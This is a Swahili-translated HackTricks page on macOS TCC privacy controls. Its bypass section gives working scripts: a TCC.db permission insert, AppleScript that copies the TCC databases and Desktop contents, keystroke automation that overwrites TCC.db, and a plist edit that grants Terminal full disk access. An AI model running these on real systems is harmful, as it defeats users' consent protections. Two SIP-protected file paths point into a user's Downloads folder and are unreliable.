# macOS TCC

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **Taarifa Msingi**

**TCC (Transparency, Consent, and Control)** ni itifaki ya usalama inayolenga kudhibiti ruhusa za programu. Jukumu lake kuu ni kulinda vipengele nyeti kama **huduma za eneo, mawasiliano, picha, kipaza sauti, kamera, ufikivu, na ufikivu kamili wa diski**. Kwa kuhitaji ridhaa wazi ya mtumiaji kabla ya kutoa programu ruhusa ya kupata vipengele hivi, TCC inaboresha faragha na udhibiti wa mtumiaji juu ya data yao.

Watumiaji wanakutana na TCC wakati programu zinapoomba ufikiaji wa vipengele vilivyolindwa. Hii inaonekana kupitia dirisha linaloruhusu watumiaji **kuidhinisha au kukataa ufikiaji**. Zaidi ya hayo, TCC inakubali hatua za moja kwa moja za mtumiaji, kama vile **kuvuta na kuacha faili kwenye programu**, kutoa ufikiaji kwa faili maalum, kuhakikisha kuwa programu zina ufikiaji tu kwa kile kilichoruhusiwa waziwazi.

![Mfano wa dirisha la TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** inashughulikiwa na **daemon** iliyoko katika `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` na imeboreshwa katika `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (kujiandikisha kwa huduma ya mach `com.apple.tccd.system`).

Kuna **tccd ya mode ya mtumiaji** inayofanya kazi kwa kila mtumiaji aliyeingia iliyoelezwa katika `/System/Library/LaunchAgents/com.apple.tccd.plist` ikijiandikisha kwa huduma za mach `com.apple.tccd` na `com.apple.usernotifications.delegate.com.apple.tccd`.

Hapa unaweza kuona tccd ikifanya kazi kama mfumo na kama mtumiaji:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Mamlaka zinarithiwa kutoka kwa programu mzazi na mamlaka hizo zinahesabiwa kulingana na Kitambulisho cha Pakiti na Kitambulisho cha Msanidi programu.

### Databases za TCC

Ruhusa/katazo kisha hufanywa kuhifadhiwa katika baadhi ya Databases za TCC:

* Database ya mfumo mzima katika **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Database hii inalindwa na SIP, hivyo ni kwa njia ya kukiuka SIP tu inaweza kuandika humo.
* Database ya mtumiaji ya TCC **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** kwa mapendeleo ya mtumiaji.
* Database hii inalindwa hivyo ni mchakato tu wenye mamlaka ya juu ya TCC kama Upatikanaji Kamili wa Diski wanaweza kuandika humo (lakini sio kulindwa na SIP).

{% hint style="warning" %}
Databases za awali pia zinalindwa na **TCC kwa upatikanaji wa kusoma**. Hivyo **hutaweza kusoma** database yako ya kawaida ya TCC isipokuwa ni kutoka kwa mchakato wenye mamlaka ya TCC.

Hata hivyo, kumbuka kwamba mchakato wenye mamlaka ya juu kama **FDA** au **`kTCCServiceEndpointSecurityClient`**) utaweza kuandika database za watumiaji wa TCC
{% endhint %}

* Kuna Database ya **tatu** ya TCC katika **`/var/db/locationd/clients.plist`** kuonyesha wateja wanaoruhusiwa kupata huduma za **eneo**.
* Faili iliyolindwa na SIP **`/Users/carlospolop/Downloads/REG.db`** (pia iliyolindwa kutoka kwa upatikanaji wa kusoma na TCC), ina **eneo** la Databases zote halali za TCC.
* Faili iliyolindwa na SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (pia iliyolindwa kutoka kwa upatikanaji wa kusoma na TCC), ina ruhusa zaidi zilizotolewa na TCC.
* Faili iliyolindwa na SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (lakini inayoweza kusomwa na yeyote) ni orodha ya programu zinazohitaji kibali cha TCC.

{% hint style="success" %}
Database ya TCC katika **iOS** iko katika **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
**Kituo cha arifa cha UI** kinaweza kufanya **mabadiliko katika database ya mfumo ya TCC**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Walakini, watumiaji wanaweza **kufuta au kuuliza sheria** kwa kutumia zana ya mstari wa amri ya **`tccutil`**.
{% endhint %}

#### Uliza mabadiliko

{% tabs %}
{% tab title="DB ya mtumiaji" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="mfumo wa DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Kwa kuchunguza mabandiko yote unaweza kuangalia ruhusa ambazo programu imeiruhusu, imezuia, au haina (itauliza kwa hilo).
{% endhint %}

* **`huduma`** ni mwakilishi wa herufi ya ruhusa ya TCC
* **`mteja`** ni **kitambulisho cha mfuko** au **njia ya binary** na ruhusa
* **`aina_ya_mteja`** inaonyesha ikiwa ni Kitambulisho cha Mfuko(0) au njia kamili(1)

<details>

<summary>Jinsi ya kutekeleza ikiwa ni njia kamili</summary>

Fanya tu **`launctl load you_bin.plist`**, na plist kama hii:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** inaweza kuwa na thamani tofauti: denied(0), unknown(1), allowed(2), au limited(3).
* **`auth_reason`** inaweza kuchukua thamani zifuatazo: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Uwanja wa **csreq** upo hapo ili kuonyesha jinsi ya kuthibitisha binary ya kutekelezwa na kutoa ruhusa za TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Kupata maelezo zaidi kuhusu **maeneo mengine** ya meza [**angalia chapisho hili la blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Unaweza pia kuangalia **ruhusa zilizotolewa tayari** kwa programu katika `Mapendeleo ya Mfumo --> Usalama & Faragha --> Faragha --> Faili na Folda`.

{% hint style="success" %}
Watumiaji _wanaweza_ **kufuta au kuuliza sheria** kwa kutumia **`tccutil`**.
{% endhint %}

#### Rudisha ruhusa za TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Ukaguzi wa Saini ya TCC

**Database** ya TCC inahifadhi **Bundle ID** ya programu, lakini pia **inahifadhi** **taarifa** kuhusu **saini** ili **kudhibitisha** kuwa Programu inayoomba kutumia idhini ni sahihi.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Kwa hivyo, programu zingine zinazotumia jina na kitambulisho cha pakiti sawa haziwezi kupata ruhusa zilizotolewa kwa programu zingine.
{% endhint %}

### Haki za Kibali na Ruhusa za TCC

Programu **si lazima tu** kuomba na kupewa **upatikanaji** wa baadhi ya rasilimali, pia zinahitaji **kuwa na haki za kibali** husika. Kwa mfano, **Telegram** ina haki ya kibali `com.apple.security.device.camera` kuomba **upatikanaji wa kamera**. Programu ambayo **haina** haki hii **haitaweza** kupata kamera (na mtumiaji hatakuulizwa ruhusa).

Hata hivyo, ili programu zipate **upatikanaji** wa **folda fulani za mtumiaji**, kama vile `~/Desktop`, `~/Downloads` na `~/Documents`, hawana haja ya kuwa na haki za kibali maalum. Mfumo utashughulikia upatikanaji kwa uwazi na **kumwuliza mtumiaji** kama inavyohitajika.

Programu za Apple **hazitatoa maombi ya ruhusa**. Zina **haki zilizotolewa mapema** kwenye orodha yao ya **haki za kibali**, maana hawatatoa **dirisha la pop-up**, **wala** hawataonekana kwenye **databases za TCC.** Kwa mfano:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Hii itazuia Kalenda kuuliza mtumiaji kupata vikumbusho, kalenda na anwani.

{% hint style="success" %}
Isipokuwa nyaraka rasmi kuhusu ruhusa, pia inawezekana kupata **habari za kuvutia kuhusu ruhusa** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Baadhi ya ruhusa za TCC ni: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Hakuna orodha ya umma inayoeleza zote lakini unaweza kuangalia hii [**orodha ya zinazojulikana**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Maeneo yasiyolindwa kwa hisia

* $HOME (yenyewe)
* $HOME/.ssh, $HOME/.aws, nk
* /tmp

### Nia ya Mtumiaji / com.apple.macl

Kama ilivyotajwa awali, inawezekana **kutoa ruhusa kwa Programu kupata faili kwa kuidondosha**. Ruhusa hii haitaorodheshwa katika kitabu chochote cha TCC lakini kama **mali iliyozidishwa ya faili**. Mali hii ita **hifadhi UUID** ya programu iliyoruhusiwa:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Ni kushangaza kwamba sifa ya **`com.apple.macl`** inasimamiwa na **Sandbox**, si tccd.

Pia elewa kwamba ukibadilisha faili inayoruhusu UUID ya programu kwenye kompyuta yako kwenda kwenye kompyuta nyingine, kwa sababu programu hiyo itakuwa na UIDs tofauti, haitatoa ruhusa kwa programu hiyo.
{% endhint %}

Kipengele cha ziada `com.apple.macl` **hakiwezi kufutwa** kama vipengele vingine vya ziada kwa sababu **linalindwa na SIP**. Hata hivyo, kama ilivyoelezwa katika [**chapisho hili**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), inawezekana kuidisable kwa **kuzip** faili, **kuidetele** na **kuizipua**.

## TCC Privesc & Bypasses

### Ingiza kwenye TCC

Ikiwa kwa wakati fulani unafanikiwa kupata ufikiaji wa kuandika kwenye database ya TCC unaweza kutumia kitu kama hiki kufanya kuingiza (ondoa maoni):

<details>

<summary>Mfano wa Kuingiza kwenye TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### Malipo ya TCC

Ikiwa umefanikiwa kuingia kwenye programu na baadhi ya ruhusa za TCC angalia ukurasa ufuatao na malipo ya TCC kuzitumia:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Uendeshaji wa Kiotomatiki (Finder) kwa FDA\*

Jina la TCC la ruhusa ya Uendeshaji wa Kiotomatiki ni: **`kTCCServiceAppleEvents`**\
Ruhusa maalum ya TCC pia inaonyesha **programu inayoweza kusimamiwa** ndani ya hifadhidata ya TCC (hivyo ruhusa haziruhusu tu kusimamia kila kitu).

**Finder** ni programu ambayo **ina FDA daima** (hata kama haionekani kwenye UI), hivyo ikiwa una ruhusa za **Uendeshaji wa Kiotomatiki** juu yake, unaweza kutumia ruhusa zake kufanya **vitendo fulani**.\
Katika kesi hii programu yako itahitaji ruhusa **`kTCCServiceAppleEvents`** juu ya **`com.apple.Finder`**.

{% tabs %}
{% tab title="Iba TCC.db za watumiaji" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Iba TCC.db ya mifumo" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Ungekiuka hii ili **kuandika database yako ya mtumiaji ya TCC**.

{% hint style="warning" %}
Kwa idhini hii, utaweza **kuomba finder kupata ufikiaji wa folda zilizozuiliwa na TCC** na kukupa faili, lakini kwa kadri ninavyojua hutaweza kufanya Finder kutekeleza nambari za kupindukia kikamilifu kutumia ufikiaji wake wa FDA.

Hivyo basi, hutaweza kutumia uwezo kamili wa FDA.
{% endhint %}

Hii ni ombi la TCC kupata ruhusa za Utoaji wa Finder:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Tafadhali kumbuka kwamba kwa sababu programu ya **Automator** ina idhini ya TCC **`kTCCServiceAppleEvents`**, inaweza **kudhibiti programu yoyote**, kama Finder. Kwa hivyo, ukiwa na idhini ya kudhibiti Automator unaweza pia kudhibiti **Finder** na nambari kama ile ifuatayo:
{% endhint %}

<details>

<summary>Pata kabati ndani ya Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Inatokea vivyo hivyo na **Programu ya Script Editor,** inaweza kudhibiti Finder, lakini kutumia AppleScript hauwezi kulazimisha kutekeleza script.

### Uendeshaji wa (SE) kwa baadhi ya TCC

**Matukio ya Mfumo yanaweza kuunda Vitendo vya Folda, na Vitendo vya Folda vinaweza kupata baadhi ya folda za TCC** (Desktop, Documents & Downloads), hivyo script kama ile ifuatayo inaweza kutumika kudhuru tabia hii:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Uendeshaji wa Kiotomatiki (SE) + Upatikanaji (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** kwa FDA\*

Uendeshaji wa Kiotomatiki kwenye **`System Events`** + Upatikanaji (**`kTCCServicePostEvent`**) inaruhusu kutuma **vibonye kwa michakato**. Kwa njia hii unaweza kutumia Finder kubadilisha TCC.db ya watumiaji au kumpa FDA programu yoyote (ingawa nywila inaweza kuombwa kwa hili).

Mfano wa Finder kubadilisha TCC.db ya watumiaji:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` hadi FDA\*

Angalia ukurasa huu kwa [**payloads za kutumia ruhusa za Ufikivu**](macos-tcc-payloads.md#accessibility) kwa privesc hadi FDA\* au kutekeleza keylogger kwa mfano.

### **Mteja wa Usalama wa Endpoint hadi FDA**

Ikiwa una **`kTCCServiceEndpointSecurityClient`**, una FDA. Mwisho.

### Sera ya Mfumo ya Faili ya SysAdmin hadi FDA

**`kTCCServiceSystemPolicySysAdminFiles`** inaruhusu **kubadilisha** sifa ya **`NFSHomeDirectory`** ya mtumiaji ambayo inabadilisha folda yake ya nyumbani na hivyo kuruhusu **kupita TCC**.

### DB ya TCC ya Mtumiaji hadi FDA

Kupata **ruhusa za kuandika** kwenye **database ya mtumiaji wa TCC** huwezi kujipa **ruhusa za `FDA`**, tu yule anayeishi kwenye database ya mfumo anaweza kutoa hiyo.

Lakini unaweza kujipa **`Haki za Utoaji wa Finder`**, na kutumia mbinu iliyopita kufikia FDA\*.

### **FDA hadi ruhusa za TCC**

**Upatikanaji Kamili wa Diski** jina la TCC ni **`kTCCServiceSystemPolicyAllFiles`**

Sioni hii kama privesc halisi, lakini kwa tahadhari: Ikiwa unadhibiti programu na FDA unaweza **kurekebisha database ya TCC ya watumiaji na kujipa ufikivu wowote**. Hii inaweza kuwa muhimu kama mbinu ya uthabiti ikiwa unaweza kupoteza ruhusa zako za FDA.

### **Kupuuza SIP hadi Kupuuza TCC**

Database ya mfumo ya **TCC** inalindwa na **SIP**, ndio sababu mchakato tu wenye **haki zilizotajwa zitaruhusiwa kurekebisha**. Kwa hivyo, ikiwa mshambuliaji anapata **kupuuza SIP** juu ya **faili** (kuweza kurekebisha faili iliyozuiwa na SIP), ataweza:

* **Ondoa ulinzi** wa database ya TCC, na kujipa ruhusa zote za TCC. Anaweza kutumia faili yoyote kwa mfano:
* Database za mifumo ya TCC
* REG.db
* MDMOverrides.plist

Hata hivyo, kuna chaguo lingine la kutumia **kupuuza SIP hii kupuuza TCC**, faili `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ni orodha ya programu zinazohitaji kibali cha TCC. Kwa hivyo, ikiwa mshambuliaji anaweza **kuondoa ulinzi wa SIP** kutoka kwa faili hii na kuongeza **programu yake mwenyewe** programu hiyo itaweza kupuuza TCC.\
Kwa mfano kuongeza terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Kupuuza TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Marejeo

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>Jifunze kuhusu kuvunja AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
